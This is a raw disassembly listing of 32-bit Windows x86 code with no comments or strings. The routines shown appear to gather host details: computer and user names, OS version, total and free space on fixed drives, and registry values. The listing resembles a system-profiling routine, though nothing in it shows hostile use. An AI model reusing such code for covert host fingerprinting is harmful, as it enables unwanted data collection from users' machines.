  406c14:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406c17:	8b e5                	mov    %ebp,%esp
  406c19:	5d                   	pop    %ebp
  406c1a:	c2 08 00             	ret    $0x8
  406c1d:	cc                   	int3
  406c1e:	cc                   	int3
  406c1f:	cc                   	int3
  406c20:	55                   	push   %ebp
  406c21:	8b ec                	mov    %esp,%ebp
  406c23:	83 ec 30             	sub    $0x30,%esp
  406c26:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  406c29:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406c2c:	e8 3f 01 00 00       	call   0x406d70
  406c31:	8b 45 0c             	mov    0xc(%ebp),%eax
  406c34:	50                   	push   %eax
  406c35:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406c38:	51                   	push   %ecx
  406c39:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406c3c:	e8 5f f1 ff ff       	call   0x405da0
  406c41:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406c44:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  406c47:	e8 84 eb ff ff       	call   0x4057d0
  406c4c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406c4f:	e8 ac e5 ff ff       	call   0x405200
  406c54:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406c57:	8b e5                	mov    %ebp,%esp
  406c59:	5d                   	pop    %ebp
  406c5a:	c2 08 00             	ret    $0x8
  406c5d:	cc                   	int3
  406c5e:	cc                   	int3
  406c5f:	cc                   	int3
  406c60:	55                   	push   %ebp
  406c61:	8b ec                	mov    %esp,%ebp
  406c63:	83 ec 10             	sub    $0x10,%esp
  406c66:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406c6d:	8b 45 08             	mov    0x8(%ebp),%eax
  406c70:	50                   	push   %eax
  406c71:	ff 15 1c 90 40 00    	call   *0x40901c
  406c77:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406c7a:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406c7e:	74 2a                	je     0x406caa
  406c80:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406c83:	51                   	push   %ecx
  406c84:	ff 15 24 90 40 00    	call   *0x409024
  406c8a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c8d:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406c90:	52                   	push   %edx
  406c91:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406c94:	50                   	push   %eax
  406c95:	8d 4d f3             	lea    -0xd(%ebp),%ecx
  406c98:	e8 43 ff ff ff       	call   0x406be0
  406c9d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406ca0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406ca3:	51                   	push   %ecx
  406ca4:	ff 15 18 90 40 00    	call   *0x409018
  406caa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406cad:	8b e5                	mov    %ebp,%esp
  406caf:	5d                   	pop    %ebp
  406cb0:	c2 04 00             	ret    $0x4
  406cb3:	cc                   	int3
  406cb4:	cc                   	int3
  406cb5:	cc                   	int3
  406cb6:	cc                   	int3
  406cb7:	cc                   	int3
  406cb8:	cc                   	int3
  406cb9:	cc                   	int3
  406cba:	cc                   	int3
  406cbb:	cc                   	int3
  406cbc:	cc                   	int3
  406cbd:	cc                   	int3
  406cbe:	cc                   	int3
  406cbf:	cc                   	int3
  406cc0:	55                   	push   %ebp
  406cc1:	8b ec                	mov    %esp,%ebp
  406cc3:	83 ec 10             	sub    $0x10,%esp
  406cc6:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  406ccd:	8b 45 08             	mov    0x8(%ebp),%eax
  406cd0:	50                   	push   %eax
  406cd1:	ff 15 1c 90 40 00    	call   *0x40901c
  406cd7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406cda:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406cde:	74 2a                	je     0x406d0a
  406ce0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406ce3:	51                   	push   %ecx
  406ce4:	ff 15 24 90 40 00    	call   *0x409024
  406cea:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406ced:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406cf0:	52                   	push   %edx
  406cf1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406cf4:	50                   	push   %eax
  406cf5:	8d 4d f3             	lea    -0xd(%ebp),%ecx
  406cf8:	e8 23 ff ff ff       	call   0x406c20
  406cfd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406d00:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d03:	51                   	push   %ecx
  406d04:	ff 15 18 90 40 00    	call   *0x409018
  406d0a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406d0d:	8b e5                	mov    %ebp,%esp
  406d0f:	5d                   	pop    %ebp
  406d10:	c2 04 00             	ret    $0x4
  406d13:	cc                   	int3
  406d14:	cc                   	int3
  406d15:	cc                   	int3
  406d16:	cc                   	int3
  406d17:	cc                   	int3
  406d18:	cc                   	int3
  406d19:	cc                   	int3
  406d1a:	cc                   	int3
  406d1b:	cc                   	int3
  406d1c:	cc                   	int3
  406d1d:	cc                   	int3
  406d1e:	cc                   	int3
  406d1f:	cc                   	int3
  406d20:	55                   	push   %ebp
  406d21:	8b ec                	mov    %esp,%ebp
  406d23:	51                   	push   %ecx
  406d24:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406d27:	6a 00                	push   $0x0
  406d29:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406d2c:	83 c1 04             	add    $0x4,%ecx
  406d2f:	e8 fc e6 ff ff       	call   0x405430
  406d34:	6a 00                	push   $0x0
  406d36:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406d39:	83 c1 18             	add    $0x18,%ecx
  406d3c:	e8 af ed ff ff       	call   0x405af0
  406d41:	b8 00 10 00 00       	mov    $0x1000,%eax
  406d46:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406d49:	66 89 01             	mov    %ax,(%ecx)
  406d4c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406d4f:	c7 42 28 00 00 00 00 	movl   $0x0,0x28(%edx)
  406d56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d59:	c7 40 2c 00 00 00 00 	movl   $0x0,0x2c(%eax)
  406d60:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d63:	8b e5                	mov    %ebp,%esp
  406d65:	5d                   	pop    %ebp
  406d66:	c3                   	ret
  406d67:	cc                   	int3
  406d68:	cc                   	int3
  406d69:	cc                   	int3
  406d6a:	cc                   	int3
  406d6b:	cc                   	int3
  406d6c:	cc                   	int3
  406d6d:	cc                   	int3
  406d6e:	cc                   	int3
  406d6f:	cc                   	int3
  406d70:	55                   	push   %ebp
  406d71:	8b ec                	mov    %esp,%ebp
  406d73:	51                   	push   %ecx
  406d74:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406d77:	6a 00                	push   $0x0
  406d79:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406d7c:	e8 3f e4 ff ff       	call   0x4051c0
  406d81:	6a 00                	push   $0x0
  406d83:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406d86:	83 c1 08             	add    $0x8,%ecx
  406d89:	e8 f2 e9 ff ff       	call   0x405780
  406d8e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d91:	c7 40 20 00 00 00 00 	movl   $0x0,0x20(%eax)
  406d98:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406d9b:	c7 41 24 00 00 00 00 	movl   $0x0,0x24(%ecx)
  406da2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406da5:	8b e5                	mov    %ebp,%esp
  406da7:	5d                   	pop    %ebp
  406da8:	c3                   	ret
  406da9:	cc                   	int3
  406daa:	cc                   	int3
  406dab:	cc                   	int3
  406dac:	cc                   	int3
  406dad:	cc                   	int3
  406dae:	cc                   	int3
  406daf:	cc                   	int3
  406db0:	55                   	push   %ebp
  406db1:	8b ec                	mov    %esp,%ebp
  406db3:	81 ec 94 06 00 00    	sub    $0x694,%esp
  406db9:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  406dbf:	50                   	push   %eax
  406dc0:	e8 eb a9 ff ff       	call   0x4017b0
  406dc5:	83 c4 04             	add    $0x4,%esp
  406dc8:	e8 43 08 00 00       	call   0x407610
  406dcd:	c7 85 c0 fb ff ff 00 	movl   $0x100,-0x440(%ebp)
  406dd4:	01 00 00 
  406dd7:	68 00 01 00 00       	push   $0x100
  406ddc:	6a 00                	push   $0x0
  406dde:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  406de4:	51                   	push   %ecx
  406de5:	e8 2a 0b 00 00       	call   0x407914
  406dea:	83 c4 0c             	add    $0xc,%esp
  406ded:	8d 95 c0 fb ff ff    	lea    -0x440(%ebp),%edx
  406df3:	52                   	push   %edx
  406df4:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  406dfa:	50                   	push   %eax
  406dfb:	ff 95 c4 fd ff ff    	call   *-0x23c(%ebp)
  406e01:	85 c0                	test   %eax,%eax
  406e03:	75 07                	jne    0x406e0c
  406e05:	32 c0                	xor    %al,%al
  406e07:	e9 f6 07 00 00       	jmp    0x407602
  406e0c:	8b 8d c0 fb ff ff    	mov    -0x440(%ebp),%ecx
  406e12:	c6 84 0d 68 fe ff ff 	movb   $0x0,-0x198(%ebp,%ecx,1)
  406e19:	00 
  406e1a:	8b 55 08             	mov    0x8(%ebp),%edx
  406e1d:	c6 02 00             	movb   $0x0,(%edx)
  406e20:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  406e26:	50                   	push   %eax
  406e27:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406e2a:	51                   	push   %ecx
  406e2b:	e8 34 0b 00 00       	call   0x407964
  406e30:	83 c4 08             	add    $0x8,%esp
  406e33:	c7 85 dc fc ff ff 00 	movl   $0x100,-0x324(%ebp)
  406e3a:	01 00 00 
  406e3d:	68 00 01 00 00       	push   $0x100
  406e42:	6a 00                	push   $0x0
  406e44:	8d 95 c8 fb ff ff    	lea    -0x438(%ebp),%edx
  406e4a:	52                   	push   %edx
  406e4b:	e8 c4 0a 00 00       	call   0x407914
  406e50:	83 c4 0c             	add    $0xc,%esp
  406e53:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  406e59:	50                   	push   %eax
  406e5a:	8d 8d c8 fb ff ff    	lea    -0x438(%ebp),%ecx
  406e60:	51                   	push   %ecx
  406e61:	ff 95 c8 fd ff ff    	call   *-0x238(%ebp)
  406e67:	85 c0                	test   %eax,%eax
  406e69:	75 07                	jne    0x406e72
  406e6b:	32 c0                	xor    %al,%al
  406e6d:	e9 90 07 00 00       	jmp    0x407602
  406e72:	8b 95 dc fc ff ff    	mov    -0x324(%ebp),%edx
  406e78:	c6 84 15 c8 fb ff ff 	movb   $0x0,-0x438(%ebp,%edx,1)
  406e7f:	00 
  406e80:	68 58 9a 40 00       	push   $0x409a58
  406e85:	8b 45 08             	mov    0x8(%ebp),%eax
  406e88:	50                   	push   %eax
  406e89:	e8 d6 0a 00 00       	call   0x407964
  406e8e:	83 c4 08             	add    $0x8,%esp
  406e91:	8d 8d c8 fb ff ff    	lea    -0x438(%ebp),%ecx
  406e97:	51                   	push   %ecx
  406e98:	8b 55 08             	mov    0x8(%ebp),%edx
  406e9b:	52                   	push   %edx
  406e9c:	e8 c3 0a 00 00       	call   0x407964
  406ea1:	83 c4 08             	add    $0x8,%esp
  406ea4:	8b 45 08             	mov    0x8(%ebp),%eax
  406ea7:	c6 40 40 00          	movb   $0x0,0x40(%eax)
  406eab:	68 94 00 00 00       	push   $0x94
  406eb0:	6a 00                	push   $0x0
  406eb2:	8d 8d 28 fb ff ff    	lea    -0x4d8(%ebp),%ecx
  406eb8:	51                   	push   %ecx
  406eb9:	e8 56 0a 00 00       	call   0x407914
  406ebe:	83 c4 0c             	add    $0xc,%esp
  406ec1:	c7 85 28 fb ff ff 94 	movl   $0x94,-0x4d8(%ebp)
  406ec8:	00 00 00 
  406ecb:	8d 95 28 fb ff ff    	lea    -0x4d8(%ebp),%edx
  406ed1:	52                   	push   %edx
  406ed2:	ff 95 c0 fd ff ff    	call   *-0x240(%ebp)
  406ed8:	85 c0                	test   %eax,%eax
  406eda:	75 07                	jne    0x406ee3
  406edc:	32 c0                	xor    %al,%al
  406ede:	e9 1f 07 00 00       	jmp    0x407602
  406ee3:	8b 85 38 fb ff ff    	mov    -0x4c8(%ebp),%eax
  406ee9:	89 85 7c f9 ff ff    	mov    %eax,-0x684(%ebp)
  406eef:	83 bd 7c f9 ff ff 01 	cmpl   $0x1,-0x684(%ebp)
  406ef6:	0f 84 9f 00 00 00    	je     0x406f9b
  406efc:	83 bd 7c f9 ff ff 02 	cmpl   $0x2,-0x684(%ebp)
  406f03:	74 05                	je     0x406f0a
  406f05:	e9 dd 00 00 00       	jmp    0x406fe7
  406f0a:	83 bd 2c fb ff ff 05 	cmpl   $0x5,-0x4d4(%ebp)
  406f11:	75 1d                	jne    0x406f30
  406f13:	83 bd 30 fb ff ff 02 	cmpl   $0x2,-0x4d0(%ebp)
  406f1a:	75 14                	jne    0x406f30
  406f1c:	68 5c 9a 40 00       	push   $0x409a5c
  406f21:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406f24:	83 c1 40             	add    $0x40,%ecx
  406f27:	51                   	push   %ecx
  406f28:	e8 37 0a 00 00       	call   0x407964
  406f2d:	83 c4 08             	add    $0x8,%esp
  406f30:	83 bd 2c fb ff ff 05 	cmpl   $0x5,-0x4d4(%ebp)
  406f37:	75 1d                	jne    0x406f56
  406f39:	83 bd 30 fb ff ff 01 	cmpl   $0x1,-0x4d0(%ebp)
  406f40:	75 14                	jne    0x406f56
  406f42:	68 68 9a 40 00       	push   $0x409a68
  406f47:	8b 55 08             	mov    0x8(%ebp),%edx
  406f4a:	83 c2 40             	add    $0x40,%edx
  406f4d:	52                   	push   %edx
  406f4e:	e8 11 0a 00 00       	call   0x407964
  406f53:	83 c4 08             	add    $0x8,%esp
  406f56:	83 bd 2c fb ff ff 05 	cmpl   $0x5,-0x4d4(%ebp)
  406f5d:	75 1d                	jne    0x406f7c
  406f5f:	83 bd 30 fb ff ff 00 	cmpl   $0x0,-0x4d0(%ebp)
  406f66:	75 14                	jne    0x406f7c
  406f68:	68 74 9a 40 00       	push   $0x409a74
  406f6d:	8b 45 08             	mov    0x8(%ebp),%eax
  406f70:	83 c0 40             	add    $0x40,%eax
  406f73:	50                   	push   %eax
  406f74:	e8 eb 09 00 00       	call   0x407964
  406f79:	83 c4 08             	add    $0x8,%esp
  406f7c:	83 bd 2c fb ff ff 04 	cmpl   $0x4,-0x4d4(%ebp)
  406f83:	77 14                	ja     0x406f99
  406f85:	68 80 9a 40 00       	push   $0x409a80
  406f8a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406f8d:	83 c1 40             	add    $0x40,%ecx
  406f90:	51                   	push   %ecx
  406f91:	e8 ce 09 00 00       	call   0x407964
  406f96:	83 c4 08             	add    $0x8,%esp
  406f99:	eb 4c                	jmp    0x406fe7
  406f9b:	83 bd 2c fb ff ff 04 	cmpl   $0x4,-0x4d4(%ebp)
  406fa2:	75 1d                	jne    0x406fc1
  406fa4:	83 bd 30 fb ff ff 00 	cmpl   $0x0,-0x4d0(%ebp)
  406fab:	75 14                	jne    0x406fc1
  406fad:	68 8c 9a 40 00       	push   $0x409a8c
  406fb2:	8b 55 08             	mov    0x8(%ebp),%edx
  406fb5:	83 c2 40             	add    $0x40,%edx
  406fb8:	52                   	push   %edx
  406fb9:	e8 a6 09 00 00       	call   0x407964
  406fbe:	83 c4 08             	add    $0x8,%esp
  406fc1:	83 bd 2c fb ff ff 04 	cmpl   $0x4,-0x4d4(%ebp)
  406fc8:	75 1d                	jne    0x406fe7
  406fca:	83 bd 30 fb ff ff 0a 	cmpl   $0xa,-0x4d0(%ebp)
  406fd1:	75 14                	jne    0x406fe7
  406fd3:	68 98 9a 40 00       	push   $0x409a98
  406fd8:	8b 45 08             	mov    0x8(%ebp),%eax
  406fdb:	83 c0 40             	add    $0x40,%eax
  406fde:	50                   	push   %eax
  406fdf:	e8 80 09 00 00       	call   0x407964
  406fe4:	83 c4 08             	add    $0x8,%esp
  406fe7:	c6 85 c4 fb ff ff 00 	movb   $0x0,-0x43c(%ebp)
  406fee:	c7 85 68 ff ff ff 00 	movl   $0x0,-0x98(%ebp)
  406ff5:	00 00 00 
  406ff8:	c7 85 d4 fc ff ff 00 	movl   $0x0,-0x32c(%ebp)
  406fff:	00 00 00 
  407002:	c6 85 0f fb ff ff 41 	movb   $0x41,-0x4f1(%ebp)
  407009:	eb 0f                	jmp    0x40701a
  40700b:	8a 8d 0f fb ff ff    	mov    -0x4f1(%ebp),%cl
  407011:	80 c1 01             	add    $0x1,%cl
  407014:	88 8d 0f fb ff ff    	mov    %cl,-0x4f1(%ebp)
  40701a:	0f be 95 0f fb ff ff 	movsbl -0x4f1(%ebp),%edx
  407021:	83 fa 5a             	cmp    $0x5a,%edx
  407024:	0f 8f 05 01 00 00    	jg     0x40712f
  40702a:	0f be 85 0f fb ff ff 	movsbl -0x4f1(%ebp),%eax
  407031:	50                   	push   %eax
  407032:	68 a4 9a 40 00       	push   $0x409aa4
  407037:	8d 8d c4 fb ff ff    	lea    -0x43c(%ebp),%ecx
  40703d:	51                   	push   %ecx
  40703e:	ff 15 74 90 40 00    	call   *0x409074
  407044:	83 c4 0c             	add    $0xc,%esp
  407047:	8d 95 c4 fb ff ff    	lea    -0x43c(%ebp),%edx
  40704d:	52                   	push   %edx
  40704e:	ff 95 e4 fd ff ff    	call   *-0x21c(%ebp)
  407054:	83 f8 03             	cmp    $0x3,%eax
  407057:	0f 85 cd 00 00 00    	jne    0x40712a
  40705d:	68 a8 9a 40 00       	push   $0x409aa8
  407062:	ff 95 e0 fc ff ff    	call   *-0x320(%ebp)
  407068:	89 85 08 fb ff ff    	mov    %eax,-0x4f8(%ebp)
  40706e:	83 bd 08 fb ff ff 00 	cmpl   $0x0,-0x4f8(%ebp)
  407075:	0f 84 af 00 00 00    	je     0x40712a
  40707b:	68 b8 9a 40 00       	push   $0x409ab8
  407080:	8b 85 08 fb ff ff    	mov    -0x4f8(%ebp),%eax
  407086:	50                   	push   %eax
  407087:	ff 95 e4 fc ff ff    	call   *-0x31c(%ebp)
  40708d:	89 85 04 fb ff ff    	mov    %eax,-0x4fc(%ebp)
  407093:	83 bd 04 fb ff ff 00 	cmpl   $0x0,-0x4fc(%ebp)
  40709a:	0f 84 8a 00 00 00    	je     0x40712a
  4070a0:	8d 8d c8 fc ff ff    	lea    -0x338(%ebp),%ecx
  4070a6:	51                   	push   %ecx
  4070a7:	8d 95 18 fb ff ff    	lea    -0x4e8(%ebp),%edx
  4070ad:	52                   	push   %edx
  4070ae:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  4070b4:	50                   	push   %eax
  4070b5:	8d 8d c4 fb ff ff    	lea    -0x43c(%ebp),%ecx
  4070bb:	51                   	push   %ecx
  4070bc:	ff 95 04 fb ff ff    	call   *-0x4fc(%ebp)
  4070c2:	6a 00                	push   $0x0
  4070c4:	68 00 04 00 00       	push   $0x400
  4070c9:	8b 95 74 ff ff ff    	mov    -0x8c(%ebp),%edx
  4070cf:	52                   	push   %edx
  4070d0:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  4070d6:	50                   	push   %eax
  4070d7:	e8 94 08 00 00       	call   0x407970
  4070dc:	6a 00                	push   $0x0
  4070de:	68 00 04 00 00       	push   $0x400
  4070e3:	52                   	push   %edx
  4070e4:	50                   	push   %eax
  4070e5:	e8 86 08 00 00       	call   0x407970
  4070ea:	03 85 d4 fc ff ff    	add    -0x32c(%ebp),%eax
  4070f0:	89 85 d4 fc ff ff    	mov    %eax,-0x32c(%ebp)
  4070f6:	6a 00                	push   $0x0
  4070f8:	68 00 04 00 00       	push   $0x400
  4070fd:	8b 8d 1c fb ff ff    	mov    -0x4e4(%ebp),%ecx
  407103:	51                   	push   %ecx
  407104:	8b 95 18 fb ff ff    	mov    -0x4e8(%ebp),%edx
  40710a:	52                   	push   %edx
  40710b:	e8 60 08 00 00       	call   0x407970
  407110:	6a 00                	push   $0x0
  407112:	68 00 04 00 00       	push   $0x400
  407117:	52                   	push   %edx
  407118:	50                   	push   %eax
  407119:	e8 52 08 00 00       	call   0x407970
  40711e:	03 85 68 ff ff ff    	add    -0x98(%ebp),%eax
  407124:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
  40712a:	e9 dc fe ff ff       	jmp    0x40700b
  40712f:	8b 85 d4 fc ff ff    	mov    -0x32c(%ebp),%eax
  407135:	50                   	push   %eax
  407136:	68 50 d5 40 00       	push   $0x40d550
  40713b:	8b 8d 68 ff ff ff    	mov    -0x98(%ebp),%ecx
  407141:	2b 8d d4 fc ff ff    	sub    -0x32c(%ebp),%ecx
  407147:	51                   	push   %ecx
  407148:	68 40 d5 40 00       	push   $0x40d540
  40714d:	8b 95 68 ff ff ff    	mov    -0x98(%ebp),%edx
  407153:	52                   	push   %edx
  407154:	68 fc d4 40 00       	push   $0x40d4fc
  407159:	68 cc 9a 40 00       	push   $0x409acc
  40715e:	8b 45 08             	mov    0x8(%ebp),%eax
  407161:	05 cc 01 00 00       	add    $0x1cc,%eax
  407166:	50                   	push   %eax
  407167:	ff 15 74 90 40 00    	call   *0x409074
  40716d:	83 c4 20             	add    $0x20,%esp
  407170:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407173:	c6 41 4c 00          	movb   $0x0,0x4c(%ecx)
  407177:	68 08 d5 40 00       	push   $0x40d508
  40717c:	8b 55 08             	mov    0x8(%ebp),%edx
  40717f:	83 c2 4c             	add    $0x4c,%edx
  407182:	52                   	push   %edx
  407183:	e8 dc 07 00 00       	call   0x407964
  407188:	83 c4 08             	add    $0x8,%esp
  40718b:	c7 85 d8 fc ff ff 50 	movl   $0x50,-0x328(%ebp)
  407192:	00 00 00 
  407195:	68 e8 9a 40 00       	push   $0x409ae8
  40719a:	ff 95 e8 fc ff ff    	call   *-0x318(%ebp)
  4071a0:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  4071a6:	83 bd 6c ff ff ff 00 	cmpl   $0x0,-0x94(%ebp)
  4071ad:	0f 84 ad 01 00 00    	je     0x407360
  4071b3:	68 f8 9a 40 00       	push   $0x409af8
  4071b8:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  4071be:	50                   	push   %eax
  4071bf:	ff 95 e4 fc ff ff    	call   *-0x31c(%ebp)
  4071c5:	89 85 fc fa ff ff    	mov    %eax,-0x504(%ebp)
  4071cb:	68 08 9b 40 00       	push   $0x409b08
  4071d0:	8b 8d 6c ff ff ff    	mov    -0x94(%ebp),%ecx
  4071d6:	51                   	push   %ecx
  4071d7:	ff 95 e4 fc ff ff    	call   *-0x31c(%ebp)
  4071dd:	89 85 00 fb ff ff    	mov    %eax,-0x500(%ebp)
  4071e3:	68 1c 9b 40 00       	push   $0x409b1c
  4071e8:	8b 95 6c ff ff ff    	mov    -0x94(%ebp),%edx
  4071ee:	52                   	push   %edx
  4071ef:	ff 95 e4 fc ff ff    	call   *-0x31c(%ebp)
  4071f5:	89 85 f8 fa ff ff    	mov    %eax,-0x508(%ebp)
  4071fb:	83 bd fc fa ff ff 00 	cmpl   $0x0,-0x504(%ebp)
  407202:	0f 84 58 01 00 00    	je     0x407360
  407208:	83 bd 00 fb ff ff 00 	cmpl   $0x0,-0x500(%ebp)
  40720f:	0f 84 4b 01 00 00    	je     0x407360
  407215:	83 bd f8 fa ff ff 00 	cmpl   $0x0,-0x508(%ebp)
  40721c:	0f 84 3e 01 00 00    	je     0x407360
  407222:	8d 45 9c             	lea    -0x64(%ebp),%eax
  407225:	50                   	push   %eax
  407226:	6a 01                	push   $0x1
  407228:	6a 00                	push   $0x0
  40722a:	68 8c d5 40 00       	push   $0x40d58c
  40722f:	68 02 00 00 80       	push   $0x80000002
  407234:	ff 95 fc fa ff ff    	call   *-0x504(%ebp)
  40723a:	85 c0                	test   %eax,%eax
  40723c:	0f 85 1e 01 00 00    	jne    0x407360
  407242:	8d 8d d8 fc ff ff    	lea    -0x328(%ebp),%ecx
  407248:	51                   	push   %ecx
  407249:	8d 55 a8             	lea    -0x58(%ebp),%edx
  40724c:	52                   	push   %edx
  40724d:	6a 00                	push   $0x0
  40724f:	6a 00                	push   $0x0
  407251:	68 28 9b 40 00       	push   $0x409b28
  407256:	8b 45 9c             	mov    -0x64(%ebp),%eax
  407259:	50                   	push   %eax
  40725a:	ff 95 00 fb ff ff    	call   *-0x500(%ebp)
  407260:	85 c0                	test   %eax,%eax
  407262:	75 32                	jne    0x407296
  407264:	8b 8d d8 fc ff ff    	mov    -0x328(%ebp),%ecx
  40726a:	c6 44 0d a8 00       	movb   $0x0,-0x58(%ebp,%ecx,1)
  40726f:	8d 55 a8             	lea    -0x58(%ebp),%edx
  407272:	52                   	push   %edx
  407273:	8b 45 08             	mov    0x8(%ebp),%eax
  407276:	83 c0 4c             	add    $0x4c,%eax
  407279:	50                   	push   %eax
  40727a:	e8 e5 06 00 00       	call   0x407964
  40727f:	83 c4 08             	add    $0x8,%esp
  407282:	68 3c 9b 40 00       	push   $0x409b3c
  407287:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40728a:	83 c1 4c             	add    $0x4c,%ecx
  40728d:	51                   	push   %ecx
  40728e:	e8 d1 06 00 00       	call   0x407964
  407293:	83 c4 08             	add    $0x8,%esp
  407296:	6a 50                	push   $0x50
  407298:	6a 00                	push   $0x0
  40729a:	8d 55 a8             	lea    -0x58(%ebp),%edx
  40729d:	52                   	push   %edx
  40729e:	e8 71 06 00 00       	call   0x407914
  4072a3:	83 c4 0c             	add    $0xc,%esp
  4072a6:	c7 85 d8 fc ff ff 50 	movl   $0x50,-0x328(%ebp)
  4072ad:	00 00 00 
  4072b0:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  4072b6:	50                   	push   %eax
  4072b7:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4072ba:	51                   	push   %ecx
  4072bb:	6a 00                	push   $0x0
  4072bd:	6a 00                	push   $0x0
  4072bf:	68 40 9b 40 00       	push   $0x409b40
  4072c4:	8b 55 9c             	mov    -0x64(%ebp),%edx
  4072c7:	52                   	push   %edx
  4072c8:	ff 95 00 fb ff ff    	call   *-0x500(%ebp)
  4072ce:	85 c0                	test   %eax,%eax
  4072d0:	75 1e                	jne    0x4072f0
  4072d2:	8b 85 d8 fc ff ff    	mov    -0x328(%ebp),%eax
  4072d8:	c6 44 05 a8 00       	movb   $0x0,-0x58(%ebp,%eax,1)
  4072dd:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4072e0:	51                   	push   %ecx
  4072e1:	8b 55 08             	mov    0x8(%ebp),%edx
  4072e4:	83 c2 4c             	add    $0x4c,%edx
  4072e7:	52                   	push   %edx
  4072e8:	e8 77 06 00 00       	call   0x407964
  4072ed:	83 c4 08             	add    $0x8,%esp
  4072f0:	c7 85 d8 fc ff ff 08 	movl   $0x8,-0x328(%ebp)
  4072f7:	00 00 00 
  4072fa:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  407300:	50                   	push   %eax
  407301:	8d 8d f4 fa ff ff    	lea    -0x50c(%ebp),%ecx
  407307:	51                   	push   %ecx
  407308:	6a 00                	push   $0x0
  40730a:	6a 00                	push   $0x0
  40730c:	68 4c 9b 40 00       	push   $0x409b4c
  407311:	8b 55 9c             	mov    -0x64(%ebp),%edx
  407314:	52                   	push   %edx
  407315:	ff 95 00 fb ff ff    	call   *-0x500(%ebp)
  40731b:	85 c0                	test   %eax,%eax
  40731d:	75 37                	jne    0x407356
  40731f:	68 3c d5 40 00       	push   $0x40d53c
  407324:	8b 85 f4 fa ff ff    	mov    -0x50c(%ebp),%eax
  40732a:	50                   	push   %eax
  40732b:	68 54 9b 40 00       	push   $0x409b54
  407330:	8d 8d e0 fa ff ff    	lea    -0x520(%ebp),%ecx
  407336:	51                   	push   %ecx
  407337:	ff 15 74 90 40 00    	call   *0x409074
  40733d:	83 c4 10             	add    $0x10,%esp
  407340:	8d 95 e0 fa ff ff    	lea    -0x520(%ebp),%edx
  407346:	52                   	push   %edx
  407347:	8b 45 08             	mov    0x8(%ebp),%eax
  40734a:	83 c0 4c             	add    $0x4c,%eax
  40734d:	50                   	push   %eax
  40734e:	e8 11 06 00 00       	call   0x407964
  407353:	83 c4 08             	add    $0x8,%esp
  407356:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  407359:	51                   	push   %ecx
  40735a:	ff 95 f8 fa ff ff    	call   *-0x508(%ebp)
  407360:	68 5c 9b 40 00       	push   $0x409b5c
  407365:	ff 95 e0 fc ff ff    	call   *-0x320(%ebp)
  40736b:	89 85 20 fb ff ff    	mov    %eax,-0x4e0(%ebp)
  407371:	83 bd 20 fb ff ff 00 	cmpl   $0x0,-0x4e0(%ebp)
  407378:	74 60                	je     0x4073da
  40737a:	68 6c 9b 40 00       	push   $0x409b6c
  40737f:	8b 95 20 fb ff ff    	mov    -0x4e0(%ebp),%edx
  407385:	52                   	push   %edx
  407386:	ff 95 e4 fc ff ff    	call   *-0x31c(%ebp)
  40738c:	89 85 dc fa ff ff    	mov    %eax,-0x524(%ebp)
  407392:	83 bd dc fa ff ff 00 	cmpl   $0x0,-0x524(%ebp)
  407399:	74 3f                	je     0x4073da
  40739b:	8d 85 a4 fa ff ff    	lea    -0x55c(%ebp),%eax
